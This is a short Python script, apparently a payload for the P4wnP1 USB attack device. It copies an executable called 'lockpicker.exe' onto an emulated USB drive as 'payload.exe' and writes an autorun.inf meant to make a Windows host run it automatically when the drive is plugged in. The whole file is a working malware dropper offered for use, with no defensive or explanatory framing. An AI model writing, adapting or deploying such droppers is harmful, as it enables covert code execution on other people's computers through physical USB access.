#!/usr/bin/env python3
import os
from pathlib import Path
import shutil

def main():
    msd_root = Path("/mnt/p4wnp1_msd")
    drop_file = os.getenv("P4WN_DROPPER_FILE", "/opt/p4wnp1/payloads/files/lockpicker.exe")
    drop_name = os.getenv("P4WN_DROPPER_NAME", "payload.exe")

    dst_file = msd_root / drop_name
    autorun_inf = msd_root / "autorun.inf"

    # Copy file
    if not os.path.exists(drop_file):
        print(f"[!] Dropper file not found: {drop_file}")
        return

    shutil.copy2(drop_file, dst_file)
    print(f"[+] Dropped {drop_file} to {dst_file}")

    # Create autorun.inf
    autorun_txt = f"""
[AutoRun]
label=Run payload
icon=shell32.dll,4
open={drop_name}
action=Execute payload
""".strip()

    with open(autorun_inf, "w") as f:
        f.write(autorun_txt)
    print(f"[+] Wrote autorun.inf to {autorun_inf}")

if __name__ == "__main__":
    main()
